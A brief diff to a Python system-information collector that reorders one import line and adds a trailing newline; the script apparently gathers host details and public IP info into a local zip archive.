@@ -1,5 +1,5 @@
-from contextlib import suppress
 import requests, platform, socket, getpass, psutil, zipfile
+from contextlib import suppress
 from datetime import datetime
 
 def GetSystemInfos(zip_file):
@@ -66,3 +66,4 @@ Public IP info:
 
 with zipfile.ZipFile("systeminfoss.zip", "w") as zf:
     GetSystemInfos(zf)
+
